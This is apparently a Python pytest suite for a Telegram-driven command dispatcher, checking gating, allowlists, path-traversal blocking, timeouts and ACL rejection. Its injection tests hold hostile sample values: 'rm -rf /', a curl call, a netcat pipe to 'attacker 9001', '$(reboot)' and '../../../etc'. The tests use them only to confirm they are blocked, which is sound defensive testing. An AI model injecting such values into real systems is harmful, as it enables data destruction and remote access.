"""Tests for the cockpit command dispatcher (C2) — the execution core.

Covers the fail-closed security pipeline end to end: gating, callback parsing,
action allowlisting, workspace-path safety, token allowlisting, shell-free argv
construction, real execution, and the timeout kill path. Also proves the
dispatcher's argv map stays in lock-step with acl.COMMAND_REGISTRY.
"""

from __future__ import annotations

import subprocess

import pytest

from sentinel.cockpit import dispatcher
from sentinel.cockpit.acl import COMMAND_REGISTRY
from sentinel.cockpit.dispatcher import ACTION_SPECS, dispatch


@pytest.fixture
def enabled(monkeypatch):
    """Turn the master execution switch ON for a test."""
    monkeypatch.setenv("COCKPIT_EXECUTION_ENABLED", "1")


@pytest.fixture
def git_project(tmp_path):
    """A real git repo inside a workspace root. Returns (root, target_name)."""
    root = tmp_path / "workspace"
    root.mkdir()
    proj = root / "myapp"
    proj.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=proj, check=True)
    return str(root), "myapp"


# ---------------------------------------------------------------------------
#  Registry / spec integrity
# ---------------------------------------------------------------------------


def test_action_specs_match_registry():
    """The dispatcher's argv map and the acl allowlist must name the SAME
    actions — neither may grow an executable action the other lacks."""
    assert set(ACTION_SPECS) == set(COMMAND_REGISTRY)


def test_no_argv_token_is_a_shell_operator():
    """No spec may smuggle a shell operator into its argv (we run shell=False,
    so these would be literal args, but their presence signals a design slip)."""
    for name, spec in ACTION_SPECS.items():
        for tok in spec.argv:
            assert tok not in ("&&", "||", ";", "|", "cd"), f"{name}: shelly token {tok!r}"


# ---------------------------------------------------------------------------
#  Master gate
# ---------------------------------------------------------------------------


def test_disabled_by_default(monkeypatch, git_project):
    """With COCKPIT_EXECUTION_ENABLED unset, nothing executes."""
    monkeypatch.delenv("COCKPIT_EXECUTION_ENABLED", raising=False)
    root, target = git_project
    res = dispatch(f"git_status:{target}:", workspace_root=root)
    assert res.ok is False
    assert res.blocked_reason == "execution-disabled"


def test_enabled_requires_exact_value(monkeypatch, git_project):
    monkeypatch.setenv("COCKPIT_EXECUTION_ENABLED", "true")  # not "1"
    root, target = git_project
    res = dispatch(f"git_status:{target}:", workspace_root=root)
    assert res.blocked_reason == "execution-disabled"


# ---------------------------------------------------------------------------
#  Input validation (fail closed)
# ---------------------------------------------------------------------------


def test_malformed_callback_blocked(enabled):
    res = dispatch("", workspace_root="/tmp")
    assert res.ok is False and res.blocked_reason == "malformed-callback"


def test_unknown_action_blocked(enabled):
    res = dispatch("frobnicate:myapp:main", workspace_root="/tmp")
    assert res.ok is False and res.blocked_reason == "unknown-action"


def test_workspace_traversal_blocked(enabled, git_project):
    root, _ = git_project
    res = dispatch("git_status:../../../etc:", workspace_root=root)
    assert res.ok is False and res.blocked_reason == "invalid-workspace"


def test_nonexistent_workspace_blocked(enabled, git_project):
    root, _ = git_project
    res = dispatch("git_status:does-not-exist:", workspace_root=root)
    assert res.ok is False and res.blocked_reason == "invalid-workspace"


@pytest.mark.parametrize("evil", [
    "main; rm -rf /",
    "main && curl evil",
    "main`whoami`",
    "$(reboot)",
    "main|nc attacker 9001",
    "main with space",
])
def test_branch_injection_blocked(enabled, git_project, evil):
    """A malicious branch token is rejected by the allowlist before any exec."""
    root, target = git_project
    res = dispatch(f"git_pull:{target}:{evil}", workspace_root=root)
    assert res.ok is False
    assert res.blocked_reason == "invalid-branch"
    assert res.argv == []  # never built, never run


def test_service_injection_blocked(enabled):
    res = dispatch("systemctl_restart:nginx; rm -rf /:", workspace_root="/tmp")
    assert res.ok is False and res.blocked_reason == "invalid-service"


# ---------------------------------------------------------------------------
#  Real execution
# ---------------------------------------------------------------------------


def test_git_status_executes_shell_free(enabled, git_project):
    """Happy path: a real git command runs, argv is fully tokenized and the
    workspace placeholder resolved to an absolute path inside the root."""
    root, target = git_project
    res = dispatch(f"git_status:{target}:", workspace_root=root)
    assert res.blocked_reason is None
    assert res.ok is True
    assert res.exit_code == 0
    # argv is the literal command vector — no shell string, abs path substituted.
    assert res.argv[:2] == ["git", "-C"]
    assert res.argv[2].endswith("/myapp")
    assert res.argv[3:] == ["status", "--short"]


def test_git_pull_builds_branch_into_argv(enabled, git_project):
    """A valid branch lands as its own argv token (not concatenated)."""
    root, target = git_project
    res = dispatch(f"git_pull:{target}:main", workspace_root=root)
    # git pull will fail (no remote) but the point is the argv shape + that it ran.
    assert res.blocked_reason is None
    assert res.argv[-3:] == ["pull", "origin", "main"]


def test_timeout_kills_process(enabled, git_project):
    """A command that overruns the time budget is SIGKILLed, not awaited."""
    root, target = git_project
    sentry = dispatcher.FiscalSentry(time_budget_seconds=0.5)
    # git_status's command is fixed, so drive the kill path through the sentry
    # directly with the same primitive the dispatcher uses.
    result = sentry.execute_with_budget(["sleep", "5"], "cockpit:test")
    assert result.was_killed is True
    assert result.exit_code == -9


# ---------------------------------------------------------------------------
#  Server wiring — the callback path stays inert unless execution is enabled
# ---------------------------------------------------------------------------


def _client():
    from fastapi.testclient import TestClient
    from sentinel.cockpit.server import create_app
    return TestClient(create_app())


def _callback_update(data: str, user_id: int = 4242):
    return {
        "callback_query": {
            "id": "cbq1",
            "from": {"id": user_id},
            "data": data,
            "message": {"chat": {"id": 99}},
        }
    }


def test_callback_inert_when_execution_disabled(monkeypatch):
    """Default behaviour: no `dispatch` key, identical to pre-C2 response."""
    monkeypatch.delenv("COCKPIT_EXECUTION_ENABLED", raising=False)
    monkeypatch.setenv("TELEGRAM_ALLOWED_USER_IDS", "4242")
    resp = _client().post("/webhooks/telegram", json=_callback_update("git_status:myapp:"))
    assert resp.status_code == 200
    body = resp.json()
    assert body["type"] == "callback_query"
    assert "dispatch" not in body


def test_callback_dispatches_when_enabled(monkeypatch):
    """With the gate on, an authorized button click runs the dispatcher and the
    result is surfaced. Unknown action -> deterministic blocked_reason."""
    monkeypatch.setenv("COCKPIT_EXECUTION_ENABLED", "1")
    monkeypatch.setenv("TELEGRAM_ALLOWED_USER_IDS", "4242")
    resp = _client().post("/webhooks/telegram", json=_callback_update("frobnicate:x:y"))
    assert resp.status_code == 200
    body = resp.json()
    assert body["dispatch"]["ok"] is False
    assert body["dispatch"]["blocked_reason"] == "unknown-action"


def test_unauthorized_user_never_dispatches(monkeypatch):
    """An unauthorized user is rejected at the ACL before dispatch can run."""
    monkeypatch.setenv("COCKPIT_EXECUTION_ENABLED", "1")
    monkeypatch.setenv("TELEGRAM_ALLOWED_USER_IDS", "4242")
    resp = _client().post(
        "/webhooks/telegram", json=_callback_update("git_status:myapp:", user_id=9999)
    )
    assert resp.status_code == 403
